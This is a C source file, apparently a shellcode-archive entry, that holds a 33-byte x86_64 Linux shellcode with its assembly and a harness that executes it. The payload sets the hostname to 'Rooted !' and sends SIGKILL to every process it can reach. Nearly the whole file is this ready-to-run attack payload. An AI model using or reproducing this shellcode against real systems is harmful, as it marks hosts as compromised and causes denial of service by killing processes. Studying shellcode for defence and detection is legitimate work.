/*
# Linux/x86_64 sethostname() & killall 33 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
*/

/*
    ; sethostname("Rooted !");
    ; kill(-1, SIGKILL);


    section .text
        global _start

    _start:

        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall

        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall
*/
int main(void)
{
    char shellcode[] =
    "\xb0\xaa\x49\xb8\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x50\x48\x89"
    "\xe7\x40\xb6\x08\x0f\x05\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";

    (*(void (*)()) shellcode)();

    return 0;
}